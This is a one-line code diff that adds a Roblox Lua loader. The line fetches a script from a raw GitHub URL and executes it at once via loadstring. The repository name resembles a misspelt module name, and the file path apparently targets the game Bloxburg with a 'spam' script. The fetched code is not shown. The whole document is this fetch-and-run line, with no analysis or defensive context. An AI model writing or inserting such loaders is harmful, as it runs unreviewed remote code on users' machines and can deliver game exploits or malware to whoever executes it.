@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/moduletanagerdefend/loaders/main/loaders/welcome-to-bloxburg-spam3-sl72renioejxf8.lua"))()
